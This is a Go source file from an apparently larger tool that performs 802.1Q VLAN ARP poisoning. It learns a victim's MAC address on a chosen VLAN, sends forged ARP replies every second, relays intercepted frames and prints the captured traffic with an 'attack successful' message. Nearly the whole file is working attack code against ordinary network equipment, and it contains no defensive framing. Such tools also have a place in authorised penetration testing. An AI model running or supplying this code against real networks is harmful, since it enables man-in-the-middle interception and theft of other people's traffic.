package dot1qpoison

import (
	"fmt"
	"net"
	"os"
	"os/signal"
	"strings"
	"time"
)

type rawSocket interface {
	Send(frame []byte) error
	Recv(buf []byte) (int, uint16, error)
	Close() error
}

// Poisoner performs 802.1Q VLAN ARP poisoning.
type Poisoner struct {
	Interface string
	SourceMAC string
	DstVLAN   int
	DstIP     string
	SrcIP     string
	Payload   string
}

func (p *Poisoner) Run() error {
	if p.DstVLAN < 0 || p.DstVLAN > 4095 {
		return fmt.Errorf("invalid --dst-vlan %d (must be 0-4095)", p.DstVLAN)
	}
	dstIP := net.ParseIP(strings.TrimSpace(p.DstIP))
	if dstIP == nil || dstIP.To4() == nil {
		return fmt.Errorf("invalid --dst-ip %q", p.DstIP)
	}
	dstIP = dstIP.To4()
	srcIP := net.ParseIP(strings.TrimSpace(p.SrcIP))
	if srcIP == nil || srcIP.To4() == nil {
		return fmt.Errorf("invalid --src-ip %q", p.SrcIP)
	}
	srcIP = srcIP.To4()

	iface, err := net.InterfaceByName(p.Interface)
	if err != nil {
		return fmt.Errorf("interface %q: %w", p.Interface, err)
	}
	ourMAC, err := resolveMAC(iface, p.SourceMAC)
	if err != nil {
		return err
	}

	sock, err := openRawSocket(iface)
	if err != nil {
		return err
	}
	defer sock.Close()

	stop := make(chan struct{})
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	go func() {
		<-sig
		close(stop)
		fmt.Printf("\n%s ARP poison stopped.\n", dot1qTag)
		os.Exit(0)
	}()

	fmt.Printf("%s Learning MAC for %s on VLAN %d...\n", dot1qTag, dstIP, p.DstVLAN)
	victimMAC, err := p.learnMAC(sock, ourMAC, srcIP, dstIP, stop)
	if err != nil {
		return err
	}
	fmt.Printf("%s ARP spoofing MAC = %s\n", arpTag, formatMAC(victimMAC))

	icmpProbe := buildTaggedICMP(ourMAC, srcIP, p.DstVLAN, p.icmpPayload())
	_ = sock.Send(icmpProbe)

	go p.poisonLoop(sock, ourMAC, dstIP, stop)

	fmt.Printf("%s Relaying traffic destined to %s on VLAN %d (Ctrl+C to stop)\n",
		dot1qTag, formatMAC(ourMAC), p.DstVLAN)

	buf := make([]byte, 65535)
	for {
		select {
		case <-stop:
			return nil
		default:
		}
		n, strippedVLAN, err := sock.Recv(buf)
		if err != nil {
			select {
			case <-stop:
				return nil
			default:
				return fmt.Errorf("recv: %w", err)
			}
		}
		frame := append([]byte{}, buf[:n]...)

		if isFromTarget(frame, dstIP, victimMAC, ourMAC) {
			fmt.Printf("%s[+] recieved data from %s, attack successful%s\n", successTag, dstIP, successTagEnd)
		}

		if pr, ok := printReceived(frame, strippedVLAN); ok {
			if pr.Tag == icmpTag && pr.DstMAC != "" {
				fmt.Printf("%s Recieved 802.1Q ICMP data from %s to %s:\n", pr.Tag, pr.SrcMAC, pr.DstMAC)
			} else {
				fmt.Printf("%s Recieved data from %s:\n", pr.Tag, pr.SrcMAC)
			}
			fmt.Printf("%s\n\n", pr.Body)
		}

		if len(frame) < 14 {
			continue
		}
		if !macEqual(frame[0:6], ourMAC) {
			continue
		}
		if macEqual(frame[6:12], ourMAC) {
			continue
		}

		victim := victimMAC
		if len(victim) != 6 {
			continue
		}

		vlanPayload := frame[14:]
		if len(vlanPayload) == 0 {
			continue
		}
		relay := buildRelayFrame(ourMAC, victim, vlanPayload)
		_ = sock.Send(relay)
	}
}

func (p *Poisoner) learnMAC(sock rawSocket, ourMAC net.HardwareAddr, srcIP, dstIP net.IP, stop <-chan struct{}) (net.HardwareAddr, error) {
	req := buildARPRequest(ourMAC, srcIP, dstIP, p.DstVLAN)
	buf := make([]byte, 65535)

	for {
		select {
		case <-stop:
			return nil, fmt.Errorf("interrupted during MAC learning")
		default:
		}

		if err := sock.Send(req); err != nil {
			return nil, fmt.Errorf("send ARP request: %w", err)
		}
		time.Sleep(800 * time.Millisecond)

		n, _, err := sock.Recv(buf)
		if err != nil {
			continue
		}
		if mac, ok := parseARPReplyForIP(buf[:n], dstIP, ourMAC); ok {
			return mac, nil
		}
	}
}

func (p *Poisoner) poisonLoop(sock rawSocket, ourMAC net.HardwareAddr, poisonIP net.IP, stop <-chan struct{}) {
	reply := buildARPPoisonReply(ourMAC, poisonIP, p.DstVLAN)
	t := time.NewTicker(time.Second)
	defer t.Stop()
	for {
		select {
		case <-stop:
			return
		case <-t.C:
			_ = sock.Send(reply)
		}
	}
}

func resolveMAC(iface *net.Interface, override string) (net.HardwareAddr, error) {
	if strings.TrimSpace(override) == "" {
		if len(iface.HardwareAddr) != 6 {
			return nil, fmt.Errorf("interface %s has invalid MAC", iface.Name)
		}
		return iface.HardwareAddr, nil
	}
	m, err := net.ParseMAC(strings.TrimSpace(override))
	if err != nil {
		return nil, fmt.Errorf("invalid --src-mac: %w", err)
	}
	if len(m) != 6 {
		return nil, fmt.Errorf("invalid --src-mac length")
	}
	return m, nil
}

func (p *Poisoner) icmpPayload() string {
	if strings.TrimSpace(p.Payload) == "" {
		return "Cisco Production"
	}
	return p.Payload
}
